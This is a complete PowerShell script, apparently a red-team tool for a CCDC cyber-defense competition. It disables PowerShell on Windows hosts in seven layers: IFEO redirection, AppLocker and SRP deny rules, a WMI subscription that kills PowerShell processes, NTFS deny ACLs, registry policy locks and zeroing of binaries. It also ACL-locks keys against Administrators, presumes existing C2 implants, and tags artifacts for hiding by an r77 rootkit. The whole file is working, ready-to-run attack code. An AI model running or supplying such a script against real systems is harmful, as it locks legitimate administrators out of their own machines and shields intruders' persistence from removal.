# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 -- PowerShell: No Shell
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)
#               T1222.001 (Windows File and Directory Permissions Modification)
#               T1546.003 (Event Triggered Execution: WMI Event Subscription)
#               T1112     (Modify Registry)
#
# Targets: Windows Server 2019, Server 2022, Windows 10
#
# Description:
#   Permanent 7-layer PowerShell execution block. Extends ShellShock.ps1 with
#   process-level intercepts ShellShock intentionally omits. Run AFTER
#   ShellShock and ONLY after C2 implants are confirmed stable -- IFEO and
#   AppLocker will block our own PS-based scheduled tasks after this runs.
#
#   -Tag77 : prefix all created artifacts with $77 so r77Shadow hides them.
#            Run Rootkit_r77Shadow.ps1 BEFORE this script when using -Tag77.
#
#   LAYER 1 -- IFEO DEBUGGER INTERCEPT
#     Writes winerr.cmd stub to System32. Sets HKLM IFEO Debugger value for
#     powershell.exe, powershell_ise.exe, and pwsh.exe so all launches redirect
#     to the stub and exit 1. IFEO keys ACL-locked against revert.
#
#   LAYER 2 -- APPLOCKER PATH DENY
#     Merges FilePathCondition Deny rules for *\powershell*.exe and *\pwsh.exe
#     into the effective AppLocker policy. Preserves existing Admin and SYSTEM
#     Allow rules. Starts AppIDSvc. SrpV2 and AppIDSvc registry keys ACL-locked.
#
#   LAYER 3 -- WMI KILL SUBSCRIPTION
#     Registers Win32_ProcessStartTrace event filter (WMISessInit) bound to a
#     CommandLineEventConsumer (WMI_SvcDispatch) that runs taskkill /f /pid.
#     Fires within ~1 second of any powershell.exe or pwsh.exe start event.
#
#   LAYER 4 -- NTFS DENY-EXECUTE ACL ON PS DIRECTORIES
#     Takes ownership of PowerShell install dirs and applies an inheritable
#     Everyone:(OI)(CI)(RX) Deny ACE at the directory node (WRP-safe -- does
#     not write explicit ACEs to WRP-protected files, only flows via inheritance).
#
#   LAYER 5 -- SRP DISALLOWED PATH RULES
#     Writes HKLM Safer\CodeIdentifiers\0\Paths disallowed rules for each PS
#     binary. Independent of AppLocker and works on all Windows SKUs.
#
#   LAYER 6 -- REGISTRY POLICY LOCK
#     Sets __PSLockdownPolicy=4 (CLM) + ExecutionPolicy=Restricted + EnableScripts=0
#     in HKLM. All three keys ACL-locked so blue team must take ownership to revert.
#
#   LAYER 7 -- FEATURE REMOVAL + ISE/PWSH ZERO-BYTE
#     DISM disables MicrosoftWindowsPowerShellV2 (eliminates -version 2 bypass).
#     Server SKUs: Uninstall-WindowsFeature PowerShell-V2. ISE binaries and any
#     PS7/PS6 pwsh.exe are zero-byteed (directory ACL from Layer 4 already blocks
#     them -- this prevents binary recovery via copy).
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

[CmdletBinding()]
param(
    [switch]$Tag77
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

# WinPriv -- enables SeTakeOwnershipPrivilege + SeRestorePrivilege for registry ACL work
if (-not ([System.Management.Automation.PSTypeName]'WinPriv').Type) {
    Add-Type @'
using System;
using System.Runtime.InteropServices;

public class WinPriv {
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool OpenProcessToken(IntPtr h, uint acc, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool LookupPrivilegeValue(string sys, string name, out long luid);
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool AdjustTokenPrivileges(IntPtr tok, bool dis,
        ref TP priv, uint z, IntPtr n1, IntPtr n2);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [StructLayout(LayoutKind.Sequential, Pack=1)]
    private struct LA { public long Luid; public uint Attr; }
    [StructLayout(LayoutKind.Sequential, Pack=1)]
    private struct TP  { public uint Count; public LA P; }

    public static bool Enable(string name) {
        IntPtr tok; long luid;
        if (!OpenProcessToken(GetCurrentProcess(), 0x28, out tok)) return false;
        if (!LookupPrivilegeValue(null, name, out luid)) return false;
        TP p = new TP { Count = 1, P = new LA { Luid = luid, Attr = 2 } };
        return AdjustTokenPrivileges(tok, false, ref p, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
'@
}

function Lock-RegistryKey {
    # Takes ownership as SYSTEM, then denies Administrators write/delete/createsubkey
    param([string]$SubKey)
    try {
        [WinPriv]::Enable("SeTakeOwnershipPrivilege") | Out-Null
        [WinPriv]::Enable("SeRestorePrivilege")       | Out-Null

        $hive = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
            [Microsoft.Win32.RegistryHive]::LocalMachine,
            [Microsoft.Win32.RegistryView]::Default)

        $k = $hive.OpenSubKey($SubKey,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::TakeOwnership)
        if (-not $k) { Write-Warn "Lock-RegistryKey: cannot open $SubKey for TakeOwnership"; return }
        $acl = $k.GetAccessControl([System.Security.AccessControl.AccessControlSections]::None)
        $sys = New-Object System.Security.Principal.SecurityIdentifier(
            [System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
        $acl.SetOwner($sys)
        $k.SetAccessControl($acl)
        $k.Close()

        $k = $hive.OpenSubKey($SubKey,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        if (-not $k) { Write-Warn "Lock-RegistryKey: cannot open $SubKey for ChangePermissions"; return }
        $acl    = $k.GetAccessControl()
        $adm    = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
        $rights = [System.Security.AccessControl.RegistryRights]"SetValue,CreateSubKey,Delete"
        $deny   = New-Object System.Security.AccessControl.RegistryAccessRule(
            $adm, $rights,
            [System.Security.AccessControl.InheritanceFlags]::None,
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AccessControlType]::Deny)
        $acl.AddAccessRule($deny)
        $k.SetAccessControl($acl)
        $k.Close()
        $hive.Close()
        Write-Success "ACL locked: HKLM:\$SubKey"
    } catch {
        Write-Warn "Lock-RegistryKey failed ($SubKey): $_"
    }
}

# ============================================================
# Config
# ============================================================

# Single-quote assignment keeps the dollar sign literal in the string value
$Prefix = if ($Tag77) { '$77' } else { '' }

$StubPath       = 'C:\Windows\System32\winerr.cmd'
$IFEOBase       = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
$TargetExeNames = @('powershell.exe', 'powershell_ise.exe', 'pwsh.exe')
$PSDirsWRP      = @(
    'C:\Windows\System32\WindowsPowerShell\v1.0',
    'C:\Windows\SysWOW64\WindowsPowerShell\v1.0'
)
$PSDirsNonWRP   = @(
    'C:\Program Files\PowerShell\7',
    'C:\Program Files\PowerShell\6'
)

$Results = [ordered]@{
    Layer1_IFEO      = 'PENDING'
    Layer2_AppLocker = 'PENDING'
    Layer3_WMI       = 'PENDING'
    Layer4_NTFS      = 'PENDING'
    Layer5_SRP       = 'PENDING'
    Layer6_Registry  = 'PENDING'
    Layer7_Feature   = 'PENDING'
}

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 -- PowerShell: No Shell"
Write-Warn "================================================================"
Write-Warn " !! Run AFTER confirming C2 is stable and not PS-dependent !!"
Write-Warn " !! IFEO + AppLocker WILL block our own PS scheduled tasks  !!"
if ($Tag77) { Write-Info " ++ Tag77 -- artifacts prefixed with `$77 (rootkit hides them)" }
Write-Host ""

# ============================================================
# Layer 1 -- IFEO Debugger Intercept
# ============================================================
Write-Section "Layer 1 -- IFEO Debugger Intercept"

try {
    $stubContent = "@echo off`r`necho Error: This command is not recognized.`r`nexit /b 1"
    Set-Content -Path $StubPath -Value $stubContent -Encoding ASCII -Force
    Write-Success "Stub written: $StubPath"

    $ifeoCount = 0
    foreach ($exe in $TargetExeNames) {
        $regPath = "$IFEOBase\$exe"
        try {
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name 'Debugger' -Value $StubPath -Force
            Write-Success "IFEO: $exe -> $StubPath"
            $ifeoCount++
            Lock-RegistryKey "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
        } catch {
            Write-Warn "IFEO failed for ${exe}: $_"
        }
    }

    if ($ifeoCount -eq $TargetExeNames.Count) {
        $Results['Layer1_IFEO'] = "OK -- stub at $StubPath, $ifeoCount/$($TargetExeNames.Count) IFEO keys set + ACL-locked"
    } elseif ($ifeoCount -gt 0) {
        $Results['Layer1_IFEO'] = "PARTIAL -- $ifeoCount/$($TargetExeNames.Count) IFEO keys set"
    } else {
        $Results['Layer1_IFEO'] = "FAILED -- no IFEO keys written"
    }
} catch {
    Write-Err "Layer 1 failed: $_"
    $Results['Layer1_IFEO'] = "FAILED -- $_"
}

# ============================================================
# Layer 2 -- AppLocker Path Deny
# ============================================================
Write-Section "Layer 2 -- AppLocker Path Deny"

try {
    Set-Service -Name AppIDSvc -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name AppIDSvc -ErrorAction SilentlyContinue
    Write-Info "AppIDSvc started / confirmed running"

    [xml]$policyDoc = (Get-AppLockerPolicy -Effective -Xml)

    $exeCollection = $policyDoc.AppLockerPolicy.RuleCollection |
        Where-Object { $_.Type -eq 'Exe' }
    if (-not $exeCollection) {
        $exeCollection = $policyDoc.CreateElement('RuleCollection')
        $exeCollection.SetAttribute('Type','Exe')
        $exeCollection.SetAttribute('EnforcementMode','Enabled')
        $policyDoc.AppLockerPolicy.AppendChild($exeCollection) | Out-Null
    } else {
        $exeCollection.SetAttribute('EnforcementMode','Enabled')
    }

    # Ensure Admin allow rule exists -- without it AppLocker blocks the OS itself
    $hasAdminAllow = $exeCollection.FilePathRule |
        Where-Object { $_.Action -eq 'Allow' -and $_.UserOrGroupSid -eq 'S-1-5-32-544' }
    if (-not $hasAdminAllow) {
        $frag = $policyDoc.CreateDocumentFragment()
        $frag.InnerXml = '<FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="Allow Admins - all files" Description="Default admin allow" UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*"/></Conditions></FilePathRule>'
        $exeCollection.AppendChild($frag) | Out-Null
    }

    # SYSTEM (S-1-5-18) is not a member of BUILTIN\Administrators -- explicit allow required
    # so our SYSTEM-context scheduled tasks are not blocked after this script runs.
    $hasSystemAllow = $exeCollection.FilePathRule |
        Where-Object { $_.Action -eq 'Allow' -and $_.UserOrGroupSid -eq 'S-1-5-18' }
    if (-not $hasSystemAllow) {
        $frag = $policyDoc.CreateDocumentFragment()
        $frag.InnerXml = '<FilePathRule Id="c7e22f1a-9b3d-4a8c-b5f0-3d4e56789abc" Name="Allow SYSTEM - all files" Description="Allow SYSTEM account unrestricted execution" UserOrGroupSid="S-1-5-18" Action="Allow"><Conditions><FilePathCondition Path="*"/></Conditions></FilePathRule>'
        $exeCollection.AppendChild($frag) | Out-Null
    }

    # Deny rules for all PS executables (S-1-1-0 = Everyone)
    $denyPaths = @('*\powershell.exe', '*\powershell_ise.exe', '*\pwsh.exe')
    foreach ($denyPath in $denyPaths) {
        $id       = [System.Guid]::NewGuid().ToString()
        $baseName = ($denyPath -split '\\')[-1] -replace '\.exe$',''
        $ruleName = "${Prefix}CCDC_Block_PS_$baseName"
        $frag = $policyDoc.CreateDocumentFragment()
        $frag.InnerXml = "<FilePathRule Id=""$id"" Name=""$ruleName"" Description=""CCDC: block $baseName"" UserOrGroupSid=""S-1-1-0"" Action=""Deny""><Conditions><FilePathCondition Path=""$denyPath""/></Conditions></FilePathRule>"
        $exeCollection.AppendChild($frag) | Out-Null
    }

    # Ensure Script and Msi collections exist (required for valid AppLocker policy schema)
    foreach ($collType in @('Script','Msi')) {
        $coll = $policyDoc.AppLockerPolicy.RuleCollection | Where-Object { $_.Type -eq $collType }
        if (-not $coll) {
            $newColl = $policyDoc.CreateElement('RuleCollection')
            $newColl.SetAttribute('Type',$collType)
            $newColl.SetAttribute('EnforcementMode','NotConfigured')
            $policyDoc.AppLockerPolicy.AppendChild($newColl) | Out-Null
        }
    }

    $tmpXml = "$env:SystemRoot\Temp\${Prefix}ccdc_al_noshell.xml"
    $policyDoc.Save($tmpXml)
    Set-AppLockerPolicy -XmlPolicy $tmpXml -Merge -ErrorAction Stop
    Remove-Item $tmpXml -Force -ErrorAction SilentlyContinue
    Write-Success "AppLocker deny rules merged: powershell.exe, powershell_ise.exe, pwsh.exe"

    if (Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2') {
        Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\SrpV2'
    }
    if (Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe') {
        Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe'
    }
    if (Test-Path 'HKLM:\SYSTEM\CurrentControlSet\Services\AppIDSvc') {
        Lock-RegistryKey 'SYSTEM\CurrentControlSet\Services\AppIDSvc'
    }

    $Results['Layer2_AppLocker'] = "OK -- 3 deny rules merged, AppIDSvc running, keys ACL-locked"
} catch {
    Write-Err "Layer 2 failed: $_"
    $Results['Layer2_AppLocker'] = "FAILED -- $_"
}

# ============================================================
# Layer 3 -- WMI Kill Subscription
# ============================================================
Write-Section "Layer 3 -- WMI Kill Subscription"

try {
    $ns = 'root\subscription'

    # Idempotent: remove stale instances by name before recreating
    foreach ($cls in @('__EventFilter','CommandLineEventConsumer')) {
        $stale = Get-WmiObject -Namespace $ns -Class $cls -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -in @('WMISessInit','WMI_SvcDispatch') }
        if ($stale) { $stale | Remove-WmiObject -ErrorAction SilentlyContinue }
    }
    $staleBindings = Get-WmiObject -Namespace $ns -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue |
        Where-Object { $_.Filter -like '*WMISessInit*' -or $_.Consumer -like '*WMI_SvcDispatch*' }
    if ($staleBindings) { $staleBindings | Remove-WmiObject -ErrorAction SilentlyContinue }

    $wql = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'powershell.exe' OR ProcessName = 'powershell_ise.exe' OR ProcessName = 'pwsh.exe'"

    $filter = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{
        Name           = 'WMISessInit'
        EventNamespace = 'root\cimv2'
        QueryLanguage  = 'WQL'
        Query          = $wql
    } -ErrorAction Stop

    $consumer = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{
        Name                = 'WMI_SvcDispatch'
        CommandLineTemplate = 'cmd.exe /c taskkill /f /pid %ProcessID%'
    } -ErrorAction Stop

    Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{
        Filter   = $filter
        Consumer = $consumer
    } -ErrorAction Stop

    Write-Success "WMI kill subscription registered (WMISessInit -> WMI_SvcDispatch)"
    $Results['Layer3_WMI'] = "OK -- WMISessInit -> WMI_SvcDispatch subscription active"
} catch {
    Write-Err "Layer 3 failed: $_"
    $Results['Layer3_WMI'] = "FAILED -- $_"
}

# ============================================================
# Layer 4 -- NTFS Deny-Execute ACL on PS Directories
# ============================================================
Write-Section "Layer 4 -- NTFS Deny-Execute ACL on PS Directories"

$aclCount = 0

# WRP-protected dirs: take ownership of directory object only (no /r).
# Apply inheritable deny at directory level -- inheritance flows to child files
# without writing explicit ACEs on WRP-protected binaries (avoids SFC triggers).
foreach ($dir in $PSDirsWRP) {
    if (-not (Test-Path $dir -PathType Container)) {
        Write-Info "Dir not found (skip): $dir"
        continue
    }
    try {
        $null = & takeown.exe /f $dir 2>&1
        $null = & icacls.exe $dir /deny "Everyone:(OI)(CI)(RX)" 2>&1
        Write-Success "Deny-execute (WRP-safe): $dir"
        $aclCount++
    } catch {
        Write-Warn "NTFS ACL failed for ${dir}: $_"
    }
}

# Non-WRP dirs (PS6/PS7 installs under Program Files): safe to recurse
foreach ($dir in $PSDirsNonWRP) {
    if (-not (Test-Path $dir -PathType Container)) {
        Write-Info "Dir not found (skip): $dir"
        continue
    }
    try {
        $null = & takeown.exe /f $dir /r /d y 2>&1
        $null = & icacls.exe $dir /deny "Everyone:(OI)(CI)(RX)" /t 2>&1
        Write-Success "Deny-execute (recursive): $dir"
        $aclCount++
    } catch {
        Write-Warn "NTFS ACL failed for ${dir}: $_"
    }
}

$totalExpected = (($PSDirsWRP + $PSDirsNonWRP) | Where-Object { Test-Path $_ }).Count
if ($totalExpected -eq 0) {
    $Results['Layer4_NTFS'] = "SKIPPED -- no target directories found"
} elseif ($aclCount -ge $totalExpected) {
    $Results['Layer4_NTFS'] = "OK -- $aclCount dirs deny-execute'd"
} elseif ($aclCount -gt 0) {
    $Results['Layer4_NTFS'] = "PARTIAL -- $aclCount/$totalExpected dirs ACL'd"
} else {
    $Results['Layer4_NTFS'] = "FAILED -- no directories ACL'd"
}

# ============================================================
# Layer 5 -- SRP Disallowed Path Rules
# ============================================================
Write-Section "Layer 5 -- SRP Disallowed Path Rules"

try {
    $srpBase  = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers'
    $pathsKey = "$srpBase\0\Paths"

    if (-not (Test-Path $srpBase)) { New-Item -Path $srpBase -Force | Out-Null }
    if (-not (Test-Path $pathsKey)) { New-Item -Path $pathsKey -Force | Out-Null }

    # Only set DefaultLevel if absent -- overwriting an existing 0 (Disallowed default)
    # would change the overall policy posture unintentionally
    if (-not (Get-ItemProperty $srpBase -Name 'DefaultLevel' -ErrorAction SilentlyContinue)) {
        Set-ItemProperty $srpBase -Name 'DefaultLevel'       -Value 0x40000 -Type DWord
        Set-ItemProperty $srpBase -Name 'PolicyScope'        -Value 0       -Type DWord
        Set-ItemProperty $srpBase -Name 'ExecutableTypes'    -Value @('EXE') -Type MultiString
        Set-ItemProperty $srpBase -Name 'TransparentEnabled' -Value 1       -Type DWord
    }

    $addedRules = 0
    foreach ($exe in $TargetExeNames) {
        $existing = Get-ChildItem $pathsKey -ErrorAction SilentlyContinue |
            Where-Object {
                (Get-ItemProperty $_.PSPath -Name 'ItemData' -ErrorAction SilentlyContinue).ItemData -imatch [regex]::Escape($exe)
            }
        if ($existing) { Write-Info "SRP rule already exists for $exe (skip)"; continue }

        $ruleGuid = "{$([System.Guid]::NewGuid().ToString().ToUpper())}"
        $ruleKey  = "$pathsKey\$ruleGuid"
        New-Item -Path $ruleKey -Force | Out-Null
        Set-ItemProperty $ruleKey -Name 'Description'  -Value 'CCDC PS block'
        Set-ItemProperty $ruleKey -Name 'ItemData'     -Value "*\$exe" -Type ExpandString
        Set-ItemProperty $ruleKey -Name 'SaferFlags'   -Value 0        -Type DWord
        Set-ItemProperty $ruleKey -Name 'LastModified' -Value (
            [System.BitConverter]::GetBytes([System.DateTime]::UtcNow.ToFileTimeUtc())
        ) -Type Binary -ErrorAction SilentlyContinue
        Write-Success "SRP disallowed path added: *\$exe"
        $addedRules++
    }

    Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers'
    Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers\0\Paths'

    $Results['Layer5_SRP'] = "OK -- $addedRules new SRP disallowed path rules, keys ACL-locked"
} catch {
    Write-Err "Layer 5 failed: $_"
    $Results['Layer5_SRP'] = "FAILED -- $_"
}

# ============================================================
# Layer 6 -- Registry Policy + Environment Lock
# ============================================================
Write-Section "Layer 6 -- Registry Policy + Environment Lock"

try {
    $envKey = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment'
    Set-ItemProperty -Path $envKey -Name '__PSLockdownPolicy' -Value '4' -Type String -Force
    Write-Success "__PSLockdownPolicy=4 (all new PS sessions enter Constrained Language Mode)"

    $psPol = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell'
    if (-not (Test-Path $psPol)) { New-Item -Path $psPol -Force | Out-Null }
    Set-ItemProperty -Path $psPol -Name 'ExecutionPolicy' -Value 'Restricted' -Type String -Force
    Set-ItemProperty -Path $psPol -Name 'EnableScripts'   -Value 0            -Type DWord  -Force
    Write-Success "PS policy: ExecutionPolicy=Restricted, EnableScripts=0"

    Lock-RegistryKey 'SYSTEM\CurrentControlSet\Control\Session Manager\Environment'
    Lock-RegistryKey 'SOFTWARE\Policies\Microsoft\Windows\PowerShell'

    $Results['Layer6_Registry'] = "OK -- __PSLockdownPolicy=4 + ExecutionPolicy=Restricted + EnableScripts=0, keys ACL-locked"
} catch {
    Write-Err "Layer 6 failed: $_"
    $Results['Layer6_Registry'] = "FAILED -- $_"
}

# ============================================================
# Layer 7 -- DISM PS2 Removal + ISE/pwsh Zero-Byte
# ============================================================
Write-Section "Layer 7 -- DISM PS2 Removal + ISE/pwsh Zero-Byte"

$l7Done = @()

# 7a: DISM -- remove PS 2.0 engine (eliminates 'powershell -version 2' CLM bypass)
try {
    $null = & dism.exe /Online /Disable-Feature /FeatureName:MicrosoftWindowsPowerShellV2 /NoRestart 2>&1
    $d1Exit = $LASTEXITCODE
    $null = & dism.exe /Online /Disable-Feature /FeatureName:MicrosoftWindowsPowerShellV2Root /NoRestart 2>&1
    $d2Exit = $LASTEXITCODE

    if ($d1Exit -in @(0, 3010) -and $d2Exit -in @(0, 3010)) {
        Write-Success "DISM: PS 2.0 engine disabled (exit $d1Exit / $d2Exit)"
        $l7Done += "PS2 engine disabled"
    } else {
        Write-Warn "DISM exit $d1Exit / $d2Exit (may already be disabled or not applicable)"
    }
} catch {
    Write-Warn "DISM PS2 removal failed: $_"
}

# 7b: Server SKU -- Uninstall-WindowsFeature (belt-and-suspenders on DISM)
try {
    $caption  = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
    $isServer = $caption -match 'Server'
    $hasCmd   = $null -ne (Get-Command Uninstall-WindowsFeature -ErrorAction SilentlyContinue)
    if ($isServer -and $hasCmd) {
        Uninstall-WindowsFeature -Name PowerShell-V2 -ErrorAction SilentlyContinue | Out-Null
        Write-Success "Uninstall-WindowsFeature PowerShell-V2 called"
        $l7Done += "WinFeature removed"
    }
} catch {
    Write-Warn "Uninstall-WindowsFeature failed: $_"
}

# 7c: Zero-byte ISE binaries (dir ACL from Layer 4 already blocks exec; this
# prevents binary recovery via copy to an unblocked path)
$iseBins = @(
    'C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe',
    'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe'
)
$iseZeroed = 0
foreach ($ise in $iseBins) {
    if (-not (Test-Path $ise -PathType Leaf)) { continue }
    try {
        $null = & takeown.exe /f $ise /a 2>&1
        $null = & icacls.exe $ise /grant "BUILTIN\Administrators:F" 2>&1
        [System.IO.File]::WriteAllBytes($ise, [byte[]]@())
        Write-Success "Zeroed: $ise"
        $iseZeroed++
    } catch {
        Write-Warn "Could not zero $ise : $_"
    }
}
if ($iseZeroed -gt 0) { $l7Done += "ISE zeroed ($iseZeroed)" }

# 7d: Zero-byte pwsh.exe in PS6/PS7 dirs (non-WRP, fully writable)
foreach ($dir in $PSDirsNonWRP) {
    $pwshBin = Join-Path $dir 'pwsh.exe'
    if (-not (Test-Path $pwshBin -PathType Leaf)) { continue }
    try {
        $null = & takeown.exe /f $pwshBin /a 2>&1
        $null = & icacls.exe $pwshBin /grant "BUILTIN\Administrators:F" 2>&1
        [System.IO.File]::WriteAllBytes($pwshBin, [byte[]]@())
        Write-Success "Zeroed: $pwshBin"
        $l7Done += "pwsh zeroed"
    } catch {
        Write-Warn "Could not zero $pwshBin : $_"
    }
}

if ($l7Done.Count -gt 0) {
    $Results['Layer7_Feature'] = "OK -- $($l7Done -join ', ')"
} else {
    $Results['Layer7_Feature'] = "PARTIAL -- DISM may need reboot; dir ACL from L4 still blocks"
}

# ============================================================
# Summary
# ============================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Magenta
Write-Host " PowerShell: No Shell -- Deployment Summary" -ForegroundColor Magenta
Write-Host "================================================================" -ForegroundColor Magenta
Write-Host ""
foreach ($layer in $Results.Keys) {
    $val = $Results[$layer]
    $col = switch -Wildcard ($val) {
        'OK*'      { 'Green'    }
        'PARTIAL*' { 'Yellow'   }
        'FAILED*'  { 'Red'      }
        'SKIPPED*' { 'DarkGray' }
        default    { 'Gray'     }
    }
    Write-Host ("  {0,-22} {1}" -f $layer, $val) -ForegroundColor $col
}
Write-Host ""
Write-Warn "NOTE: IFEO intercepts (L1) and NTFS ACLs (L4) take effect immediately."
Write-Warn "NOTE: AppLocker (L2) requires AppIDSvc running (auto-start set by this script)."
Write-Warn "NOTE: __PSLockdownPolicy (L6) applies only to NEW PS sessions."
Write-Warn "NOTE: DISM feature removal (L7) may require a reboot to fully finalize."
Write-Host ""
